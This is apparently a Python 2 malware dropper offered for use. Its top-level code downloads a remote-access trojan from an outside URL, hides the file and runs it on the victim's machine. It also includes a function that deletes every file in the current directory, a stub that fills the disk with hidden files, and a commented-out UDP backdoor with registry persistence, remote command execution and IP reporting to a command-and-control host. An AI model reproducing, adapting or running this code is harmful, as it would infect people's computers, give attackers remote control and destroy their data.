import os,urllib2
ratlink="http://www.s4mick.com/virus.exe"  #your site with the rat\exe you want to spread
virusname="bob.exe"

def remove(ack):
    if ack == "all" :
        files=os.listdir(os.getcwd())
        for f in files:
          os.remove(f)
    #elif ack== "justme":
      #  os.remove("S4_ware.exe") name of malware
        
   
def HDkiller():
    fn="a"+randint(2,100)+".txt"  #random thingy so won't conflict with another file permission
    f = open(fn, "wb")
    size = 1073741824 # bytes in 1 GiB
    f.write("a" * 1)#put size here
    cmd=os.popen("attrib +h "+fn)
    cmd.close()
""" When i have time ill implement the udp backdoor for remote shell & file transfer
#def Backdoor():
##  socketRicezione = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) # UDP
 # socketRicezione.bind((socket.gethostname(), 1111))
#  data=""
  #os.popen("REG ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v UDPyRat /d C:\UDPyRat.exe ")
#  while True: #riceve elabora poi reinvia
 #     print "ip logged on site/pyrat.txt"
  #    urllib2.urlopen("http://samick.url.ph/login/PHP/ip.php")
  #    msg, addr = socketRicezione.recvfrom(1024) # buffer size is 1024 bytes   
  #    data=os.popen(msg).read()
  #    data=data[::-1]# reverse string
    #  print data
   #   data=base64.b64encode(data) # encode base64 string
     # print data
   #   socketInvio = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    #  socketInvio.sendto(data,0,("192.168.1.5",2222)) #cambia l'ip al mio c&c con dyndns
"""


#
#HDkiller()
#

df = urllib2.urlopen(ratlink) #your site hosting the rat or whatever file u want to upload into victim
output = open(virusname,"wb")
output.write(df.read()) 
output.close()
os.popen("attrib +h "+virusname) #hide the file
os.popen("start "+virusname) #start the file




#urllib2.urlopen("www.phpscript.yoursite") to send an ack message to you that a bot was infected
#remove("ok") remove all directory or the honeypot file executed  uncomment if you want this
